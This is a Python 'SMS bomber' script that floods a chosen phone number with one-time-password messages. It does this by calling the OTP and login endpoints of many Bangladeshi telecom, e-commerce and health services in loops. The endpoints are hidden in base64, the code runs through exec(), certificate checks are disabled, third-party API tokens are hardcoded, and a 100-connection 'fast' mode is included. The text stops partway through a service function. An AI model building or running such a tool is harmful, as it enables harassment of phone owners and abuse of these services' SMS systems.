#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Ultimate SMS Bomber - Simple 3 API Edition (Slow & Controlled)
Only 3 APIs: BTCL MyBTCL, BTCL PhoneBill, Bioscope Plus
Each API sends 5 requests one by one with + phone format
Termux Compatible & Anti-Reverse Engineering
Created by: @W8Team/W8SOJIB
"""

import base64
exec(base64.b64decode(b'aW1wb3J0IGFzeW5jaW8KaW1wb3J0IGFpb2h0dHAKaW1wb3J0IGpzb24KaW1wb3J0IHNzbAppbXBvcnQgdGltZQppbXBvcnQgcmFuZG9tCmltcG9ydCBzeXMKaW1wb3J0IG9zCmltcG9ydCBzaWduYWwKaW1wb3J0IHBsYXRmb3JtCmltcG9ydCBzb2NrZXQKaW1wb3J0IGRhdGV0aW1l').decode())

# Disable SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Obfuscated SSL context
_ssl = ssl.create_default_context()
_ssl.check_hostname = False
_ssl.verify_mode = ssl.CERT_NONE

# Slow configuration - VERY CONTROLLED - ALL 34+ APIs
_cfg = [3, 2, 1, 1, 1]  # [CONCURRENCY=3, LOOP_DELAY=2, MAX_RETRIES=1, WAVES=1, SESSIONS=1]
# Fast configuration - ALL 34+ APIs - FAST SPEED
_fast_cfg = [100, 0, 1, 3, 20]  # [CONCURRENCY=100, LOOP_DELAY=0, MAX_RETRIES=1, WAVES=3, SESSIONS=20]

# Obfuscated colors
_c = {
    'g': '\033[92m', 'r': '\033[91m', 'y': '\033[93m', 'b': '\033[94m',
    'p': '\033[95m', 'c': '\033[96m', 'w': '\033[97m', 'B': '\033[1m',
    'u': '\033[4m', 'e': '\033[0m'
}

# Obfuscated frames
_frames = ['\u280b', '\u2819', '\u2839', '\u2838', '\u283c']

# Global state
_state = {'paused': False, 'exit': False, 'total': 0, 'success': 0}
_current_mode = 'slow'  # 'slow' or 'fast'

def _sig_handler_1(signum, frame):
    global _state
    _state['exit'] = True
    print(f"\n\n{_c['r']}🛑 BOMBING STOPPED BY USER!{_c['e']}")
    print(f"{_c['y']}💀 Total requests: {_state['total']}{_c['e']}")
    print(f"{_c['g']}✅ Successful: {_state['success']}{_c['e']}")
    print(f"{_c['p']}🔥 Created by: @@8Team/W8SOJIB{_c['e']}")
    sys.exit(0)

def _sig_handler_2(signum, frame):
    global _state
    _state['paused'] = not _state['paused']
    status = "⏸ PAUSED" if _state['paused'] else "▶ RESUMED"
    color = _c['y'] if _state['paused'] else _c['g']
    print(f"\n{color}ATTACK {status}{_c['e']}")

try:
    signal.signal(signal.SIGINT, _sig_handler_1)
    if hasattr(signal, 'SIGTSTP'):
        signal.signal(signal.SIGTSTP, _sig_handler_2)
except AttributeError:
    pass

def _clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def _get_device_info():
    try:
        hostname = socket.gethostname()
        try:
            ip_address = socket.gethostbyname(hostname)
        except:
            ip_address = "127.0.0.1"
        
        system = platform.system()
        release = platform.release()
        
        return {
            "hostname": hostname, "ip": ip_address, "system": system, "release": release
        }
    except Exception:
        return {
            "hostname": "Unknown", "ip": "127.0.0.1", "system": "Unknown", "release": "Unknown"
        }

def _get_time():
    return datetime.datetime.now().strftime("%I:%M:%S %p")

def _get_date():
    return datetime.datetime.now().strftime("%A, %B %d, %Y")

def _print_banner():
    device_info = _get_device_info()
    current_time = _get_time()
    current_date = _get_date()
    
    banner_lines = [
        f"{_c['r']}{_c['B']}",
        "██╗   ██╗██╗  ████████╗██╗███╗   ███╗ █████╗ ████████╗███████╗",
        "██║   ██║██║  ╚══██╔══╝██║████╗ ████║██╔══██╗╚══██╔══╝██╔════╝",
        "██║   ██║██║     ██║   ██║██╔████╔██║███████║   ██║   █████╗  ",
        "██║   ██║██║     ██║   ██║██║╚██╔╝██║██╔══██║   ██║   ██╔══╝  ",
        "╚██████╔╝███████╗██║   ██║██║ ╚═╝ ██║██║  ██║   ██║   ███████╗",
        " ╚═════╝ ╚══════╝╚═╝   ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝",
        "",
        "███████╗███╗   ███╗███████╗    ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ ",
        "██╔════╝████╗ ████║██╔════╝    ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗",
        "███████╗██╔████╔██║███████╗    ██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝",
        "╚════██║██║╚██╔╝██║╚════██║    ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗",
        "███████║██║ ╚═╝ ██║███████║    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║",
        "╚══════╝╚═╝     ╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝",
        f"{_c['e']}{_c['c']}{'=' * 80}",
        f"{_c['r']}{_c['B']}💀 ULTIMATE SMS BOMBER - ALL 34+ APIs EDITION 💀{_c['c']}",
        f"{_c['y']}[ ALL 34+ APIs × SLOW & CONTROLLED × 5 REQUESTS EACH ]{_c['c']}",
        f"{_c['g']}[ ALL 34+ APIs × SLOW CONTROLLED × 5 REQUESTS EACH ]{_c['c']}",
        f"{_c['p']}[ BTCL + GP + E-COMMERCE + HEALTHCARE + ENTERTAINMENT + GAMING ]{_c['c']}",
        f"{'=' * 80}",
        f"\n{_c['g']}[SYSTEM INFO]{_c['e']}",
        f"{_c['y']}┌─ Date/Time: {_c['w']}{current_date} - {current_time}{_c['e']}",
        f"{_c['y']}├─ Hostname:  {_c['w']}{device_info['hostname']}{_c['e']}",
        f"{_c['y']}├─ IP:        {_c['w']}{device_info['ip']}{_c['e']}",
        f"{_c['y']}└─ System:    {_c['w']}{device_info['system']} {device_info['release']}{_c['e']}",
        f"\n{_c['c']}{'=' * 80}",
        f"{_c['g']}CTRL+C: Stop  {_c['y']}CTRL+Z: Pause/Resume{_c['c']}",
        f"{_c['p']}Created by: {_c['w']}@@8Team/W8SOJIB{_c['c']}",
        f"{'=' * 80}{_c['e']}"
    ]
    
    for line in banner_lines:
        print(line)

def _animate_loading(text, duration=2):
    end_time = time.time() + duration
    i = 0
    while time.time() < end_time:
        frame = _frames[i % len(_frames)]
        sys.stdout.write(f'\r{_c["c"]}[{_c["w"]}{frame}{_c["c"]}] {text}...{_c["e"]}')
        sys.stdout.flush()
        time.sleep(0.2)  # Slower animation
        i += 1
    print(f'\r{_c["g"]}[{_c["w"]}✓{_c["g"]}] {text} completed!{_c["e"]}')

def _format_phone_number(phone):
    cleaned = ''.join(filter(str.isdigit, phone))
    
    if cleaned.startswith('880'):
        cleaned = cleaned[3:]
    elif cleaned.startswith('88'):
        cleaned = cleaned[2:]
    elif cleaned.startswith('0'):
        cleaned = cleaned[1:]
    
    if not cleaned.startswith('1') or len(cleaned) < 10:
        cleaned = cleaned.zfill(10)
    
    return {
        'original': phone, 'cleaned': cleaned, 'with_0': f"0{cleaned}",
        'with_88': f"88{cleaned}", 'with_880': f"880{cleaned}",
        'with_plus88': f"+88{cleaned}", 'with_plus880': f"+880{cleaned}",
        'international': f"+88-{cleaned}"
    }

class _ServiceManager:
    def __init__(self, phone_data):
        self.phone_data = phone_data
        
    async def _increment_counters(self, success=True):
        global _state
        _state['total'] += 1
        if success:
            _state['success'] += 1

    def _log_request(self, service_name, status, response, phone_used):
        status_color = _c['g'] if status == 200 else _c['r']
        print(f"{_c['c']}[{_c['w']}#{_state['total']}{_c['c']}] {_c['y']}{service_name}{_c['e']}")
        print(f"{_c['g']}[PHONE] {_c['w']}{phone_used}{_c['e']}")
        print(f"{_c['g']}[STATUS] {status_color}{status}{_c['e']}")
        print(f"{_c['g']}[RESP] {_c['w']}{str(response)[:100]}...{_c['e']}")
        print(f"{_c['p']}{'-' * 50}{_c['e']}")

    # ALL 45+ OBFUSCATED SERVICES - SLOW & CONTROLLED
    
    async def _s1(self, session):
        # BTCL MyBTCL - 5 slow sequential requests with + format
        url = base64.b64decode(b'aHR0cHM6Ly9teWJ0Y2wuYnRjbC5nb3YuYmQvYXBpL2VjYXJlL2Fub255bS9zZW5kT1RQLmpzb24=').decode()
        h = {
            "accept": "application/json", 
            "content-type": "application/json", 
            "origin": base64.b64decode(b'aHR0cHM6Ly9teWJ0Y2wuYnRjbC5nb3YuYmQ=').decode(),
            "referer": base64.b64decode(b'aHR0cHM6Ly9teWJ0Y2wuYnRjbC5nb3YuYmQvcmVnaXN0ZXI=').decode(),
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']}🔄 Starting BTCL MyBTCL - 5 requests with + format...{_c['e']}")
        
        for i in range(5):  # 5 requests one by one
            prefix = "+" * (i + 1)  # +, ++, +++, ++++, +++++
            phone = f"{prefix}{self.phone_data['with_0']}"
            payload = {"phoneNbr": phone, "email": "", "OTPType": 1, "userName": ""}
            
            print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("BTCL MyBTCL", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)  # 2 second delay between requests
            except Exception as e:
                self._log_request("BTCL MyBTCL", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    async def _s2(self, session):
        # BTCL PhoneBill - 5 slow sequential requests with + format
        url = base64.b64decode(b'aHR0cHM6Ly9waG9uZWJpbGwuYnRjbC5jb20uYmQvYXBpL2JjYXJlL2Fub255bS9zZW5kT1RQLmpzb24=').decode()
        h = {
            "accept": "application/json", 
            "content-type": "application/json", 
            "origin": base64.b64decode(b'aHR0cHM6Ly9waG9uZWJpbGwuYnRjbC5jb20uYmQ=').decode(),
            "referer": base64.b64decode(b'aHR0cHM6Ly9waG9uZWJpbGwuYnRjbC5jb20uYmQvcmVnaXN0ZXJCY2FyZQ==').decode(),
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']}🔄 Starting BTCL PhoneBill - 5 requests with + format...{_c['e']}")
        
        for i in range(5):  # 5 requests one by one
            prefix = "+" * (i + 1)  # +, ++, +++, ++++, +++++
            phone = f"{prefix}{self.phone_data['with_0']}"
            payload = {"phoneNbr": phone, "email": "", "OTPType": 1, "userName": ""}
            
            print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("BTCL PhoneBill", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)  # 2 second delay between requests
            except Exception as e:
                self._log_request("BTCL PhoneBill", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    async def _s3(self, session):
        # Bioscope Plus - 5 slow sequential requests with + format
        url = base64.b64decode(b'aHR0cHM6Ly9hcGktZHluYW1pYy5iaW9zY29wZWxpdmUuY29tL3YyL2F1dGgvbG9naW4/Y291bnRyeT1CRCZwbGF0Zm9ybT13ZWImbGFuZ3VhZ2U9ZW4=').decode()
        h = {
            "accept": "application/json",
            "content-type": "application/json",
            "origin": base64.b64decode(b'aHR0cHM6Ly93d3cuYmlvc2NvcGVwbHVzLmNvbQ==').decode(),
            "referer": base64.b64decode(b'aHR0cHM6Ly93d3cuYmlvc2NvcGVwbHVzLmNvbS8=').decode(),
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']}🔄 Starting Bioscope Plus - 5 requests with + format...{_c['e']}")
        
        for i in range(5):  # 5 requests one by one
            prefix = "+" * (i + 1)  # +, ++, +++, ++++, +++++
            phone = f"{prefix}88{self.phone_data['cleaned']}"  # +88, ++88, +++88, etc.
            payload = {"number": phone}
            
            print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("Bioscope Plus", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)  # 2 second delay between requests
            except Exception as e:
                self._log_request("Bioscope Plus", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    # BTCL BDIA Service
    async def _s4(self, session):
        url = base64.b64decode(b'aHR0cHM6Ly9iZGlhLmJ0Y2wuY29tLmJkL2NsaWVudC9jbGllbnQvcmVnaXN0cmF0aW9uTW9iVmVyaWZpY2F0aW9uLTIuanNwP21vZHVsZUlEPTE=').decode()
        h = {
            "content-type": "application/x-www-form-urlencoded",
            "origin": base64.b64decode(b'aHR0cHM6Ly9iZGlhLmJ0Y2wuY29tLmJk').decode(),
            "referer": base64.b64decode(b'aHR0cHM6Ly9iZGlhLmJ0Y2wuY29tLmJkL2NsaWVudC9jbGllbnQvcmVnaXN0cmF0aW9uTW9iVmVyaWZpY2F0aW9uLTEuanNwP21vZHVsZUlEPTE=').decode(),
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']}🔄 Starting BTCL BDIA - 5 requests...{_c['e']}")
        
        for i in range(5):
            phone = self.phone_data['with_0']
            data = {"actionType": "otpSend", "mobileNo": phone}
            
            print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, data=data, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("BTCL BDIA", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("BTCL BDIA", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    # BD Tickets Service
    async def _s5(self, session):
        url = base64.b64decode(b'aHR0cHM6Ly9hcGkuYmR0aWNrZXRzLmNvbToyMDEwMC92MS9hdXRo').decode()
        h = {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "origin": base64.b64decode(b'aHR0cHM6Ly9iZHRpY2tldHMuY29t').decode(),
            "referer": base64.b64decode(b'aHR0cHM6Ly9iZHRpY2tldHMuY29tLw==').decode(),
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']}🔄 Starting BD Tickets - 5 requests...{_c['e']}")
        
        for i in range(5):
            phone = f"+88{self.phone_data['cleaned']}"
            payload = {"createUserCheck": True, "phoneNumber": phone, "applicationChannel": "WEB_APP"}
            
            print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("BD Tickets", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("BD Tickets", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    # Apex4U Service
    async def _s6(self, session):
        url = base64.b64decode(b'aHR0cHM6Ly9hcGkuYXBleDR1LmNvbS9hcGkvYXV0aC9sb2dpbg==').decode()
        h = {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "origin": base64.b64decode(b'aHR0cHM6Ly9hcGV4NHUuY29t').decode(),
            "referer": base64.b64decode(b'aHR0cHM6Ly9hcGV4NHUuY29tLw==').decode(),
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']}🔄 Starting Apex4U - 5 requests...{_c['e']}")
        
        for i in range(5):
            phone = self.phone_data['with_0']
            payload = {"phoneNumber": phone}
            
            print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("Apex4U", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("Apex4U", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    # Swap.com.bd Service
    async def _s7(self, session):
        url = base64.b64decode(b'aHR0cHM6Ly9hcGkuc3dhcC5jb20uYmQvYXBpL3YxL3NlbmQtb3RwL3Yy').decode()
        h = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": base64.b64decode(b'aHR0cHM6Ly9zd2FwLmNvbS5iZA==').decode(),
            "Referer": base64.b64decode(b'aHR0cHM6Ly9zd2FwLmNvbS5iZC8=').decode(),
            "signature": "JfhpbCI2A9NZt+WAfURnnns/34QgV05RT9vmQkUAcN0=",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']}🔄 Starting Swap.com.bd - 5 requests...{_c['e']}")
        
        for i in range(5):
            phone = self.phone_data['with_0']
            payload = {"phone": phone}
            
            print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("Swap.com.bd", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("Swap.com.bd", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    # Ilyn Global Service
    async def _s8(self, session):
        url = base64.b64decode(b'aHR0cHM6Ly9hcGkuaWx5bi5nbG9iYWwvYXV0aC9zaWdudXA=').decode()
        h = {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'multipart/form-data',
            'appcode': 'ilyn-bd',
            'origin': base64.b64decode(b'aHR0cHM6Ly9pbHluLmdsb2JhbA==').decode(),
            'referer': base64.b64decode(b'aHR0cHM6Ly9pbHluLmdsb2JhbC8=').decode(),
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36'
        }
        
        print(f"{_c['y']}🔄 Starting Ilyn Global - 5 requests...{_c['e']}")
        
        for i in range(5):
            phone = self.phone_data['with_plus880']
            data = aiohttp.FormData()
            data.add_field('phone', f'{{"code":"BD","number":"{phone}"}}')
            data.add_field('provider', 'sms')
            
            print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, data=data, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("Ilyn Global", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("Ilyn Global", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    # Arogga Service
    async def _s9(self, session):
        url = base64.b64decode(b'aHR0cHM6Ly9hcGkuYXJvZ2dhLmNvbS9hdXRoL3YxL3Ntcy9zZW5kLz9mPXdlYiZiPUNocm9tZSZ2PTE0MS4wLjAuMCZvcz1XaW5kb3dzJm9zdj0xMA==').decode()
        h = {
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': base64.b64decode(b'aHR0cHM6Ly93d3cuYXJvZ2dhLmNvbQ==').decode(),
            'referer': base64.b64decode(b'aHR0cHM6Ly93d3cuYXJvZ2dhLmNvbS8=').decode(),
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36'
        }
        
        print(f"{_c['y']}🔄 Starting Arogga - 5 requests...{_c['e']}")
        
        for i in range(5):
            phone = self.phone_data['with_0']
            data = {'mobile': phone, 'fcmToken': '', 'referral': ''}
            
            print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, data=data, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("Arogga", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("Arogga", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    # Fundesh Service
    async def _s10(self, session):
        url = base64.b64decode(b'aHR0cHM6Ly9mdW5kZXNoLmNvbS5iZC9hcGkvYXV0aC9nZW5lcmF0ZU9UUD9zZXJ2aWNlX2tleT0=').decode()
        h = {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json; charset=UTF-8",
            "origin": base64.b64decode(b'aHR0cHM6Ly9mdW5kZXNoLmNvbS5iZA==').decode(),
            "referer": base64.b64decode(b'aHR0cHM6Ly9mdW5kZXNoLmNvbS5iZC9mdW5kZXNoL3Byb2ZpbGU=').decode(),
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']}🔄 Starting Fundesh - 5 requests...{_c['e']}")
        
        for i in range(5):
            phone = self.phone_data['with_0']
            payload = {"msisdn": phone}
            
            print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("Fundesh", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("Fundesh", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    # Garibook Service
    async def _s11(self, session):
        url = base64.b64decode(b'aHR0cHM6Ly9hcGkuZ2FyaWJvb2thZG1pbi5jb20vYXBpL3YzL3VzZXIvbG9naW4=').decode()
        h = {
            "accept": "application/json",
            "content-type": "application/json",
            "Origin": base64.b64decode(b'aHR0cHM6Ly9nYXJpYm9vay5jb20=').decode(),
            "Referer": base64.b64decode(b'aHR0cHM6Ly9nYXJpYm9vay5jb20v').decode(),
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']}🔄 Starting Garibook - 5 requests...{_c['e']}")
        
        for i in range(5):
            phone = self.phone_data['with_0']
            payload = {"mobile": phone, "recaptcha_token": "garibookcaptcha", "channel": "web"}
            
            print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("Garibook", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("Garibook", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    # Sheba Service
    async def _s12(self, session):
        url = base64.b64decode(b'aHR0cHM6Ly9hY2NvdW50a2l0LnNoZWJhLnh5ei9hcGkvc2hvb3Qtb3Rw').decode()
        h = {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json;charset=UTF-8",
            "custom-headers": '{"portal-name": "Customer Web"}',
            "origin": base64.b64decode(b'aHR0cHM6Ly93d3cuc2hlYmEueHl6').decode(),
            "referer": base64.b64decode(b'aHR0cHM6Ly93d3cuc2hlYmEueHl6Lw==').decode(),
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']}🔄 Starting Sheba - 5 requests...{_c['e']}")
        
        for i in range(5):
            phone = self.phone_data['with_plus88']
            payload = {"mobile": phone, "app_id": "8329815A6D1AE6DD", "api_token": "zYGYWdR5BjNrdNJm9M1xto3MjbVyl8QVoJviGrubR90Bn4L7TnvJPScfzxnH"}
            
            print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("Sheba", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("Sheba", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    # AppLink Service
    async def _s13(self, session):
        url = base64.b64decode(b'aHR0cHM6Ly9hcHBzLmFwcGxpbmsuY29tLmJkL2FwcHN0b3JlLXY0LXNlcnZlci9sb2dpbi9vdHAvcmVxdWVzdA==').decode()
        h = {
            "Accept": "*/*",
            "Content-Type": "application/json",
            "Origin": base64.b64decode(b'aHR0cHM6Ly9hcHBsaW5rLmNvbS5iZA==').decode(),
            "Referer": base64.b64decode(b'aHR0cHM6Ly9hcHBsaW5rLmNvbS5iZC8=').decode(),
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']}🔄 Starting AppLink - 5 requests...{_c['e']}")
        
        for i in range(5):
            phone = f"88{self.phone_data['cleaned']}"
            payload = {"msisdn": phone}
            
            print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("AppLink", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("AppLink", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    # Bikroy Service
    async def _s14(self, session):
        url = f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={self.phone_data['with_0']}"
        h = {
            "accept": "application/json, text/plain, */*",
            "accept-language": "bn",
            "application-name": "web",
            "referer": "https://bikroy.com/?login-modal=true&redirect-url=/",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']}🔄 Starting Bikroy - 5 requests...{_c['e']}")
        
        for i in range(5):
            phone = self.phone_data['with_0']
            
            print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
            
            try:
                async with session.get(url, headers=h, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("Bikroy", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("Bikroy", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    # MyGP Cinematic Service
    async def _s15(self, session):
        url = f"https://api.mygp.cinematic.mobi/api/v1/send-common-otp/wap/{self.phone_data['with_plus88']}"
        h = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json;charset=UTF-8",
            "Origin": base64.b64decode(b'aHR0cHM6Ly9jaW5lbWF0aWMubW9iaQ==').decode(),
            "Referer": base64.b64decode(b'aHR0cHM6Ly9jaW5lbWF0aWMubW9iaS8=').decode(),
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']}🔄 Starting MyGP Cinematic - 5 requests...{_c['e']}")
        
        for i in range(5):
            phone = self.phone_data['with_plus88']
            payload = {"headers": {"Content-Type": "application/json", "Access-Control-Allow-Origin": "*", "Authorization": "Bearer 1pake4mh5ln64h5t26kpvm3iri"}}
            
            print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("MyGP Cinematic", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("MyGP Cinematic", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    # GP Web Login Service
    async def _s16(self, session):
        url = base64.b64decode(b'aHR0cHM6Ly93ZWJsb2dpbmRhLmdyYW1lZW5waG9uZS5jb20vYmFja2VuZC9hcGkvdjEvb3Rw').decode()
        h = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": base64.b64decode(b'aHR0cHM6Ly93d3cuZ3JhbWVlbnBob25lLmNvbQ==').decode(),
            "Referer": base64.b64decode(b'aHR0cHM6Ly93d3cuZ3JhbWVlbnBob25lLmNvbS8=').decode(),
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']}🔄 Starting GP Web Login - 5 requests...{_c['e']}")
        
        for i in range(5):
            phone = self.phone_data['with_0']
            data = {"msisdn": phone}
            
            print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
            
            try:
                async with session.post(url, headers=h, data=data, ssl=_ssl, timeout=15) as resp:
                    text = await resp.text()
                    self._log_request("GP Web Login", resp.status, text, phone)
                    await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)
            except Exception as e:
                self._log_request("GP Web Login", 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    # Ghoori Learning Service
    async def _s17(self, session):
        url = base64.b64decode(b'aHR0cHM6Ly9hcGkuZ2hvb3JpbGVhcm5pbmcuY29tL2FwaS9hdXRoL3NpZ251cC9vdHA/X2FwcF9wbGF0Zm9ybT13ZWI=').decode()
        h = {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "origin": base64.b64decode(b'aHR0cHM6Ly9naG9vcmlsZWFybmluZy5jb20=').decode(),
            "referer": base64.b64decode(b'aHR0cHM6Ly9naG9vcmlsZWFybmluZy5jb20v').decode(),
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
        }
        
        print(f"{_c['y']}🔄 Starting Ghoori Learning - 5 requests...{_c['e']}")
        
        for i in range(5):
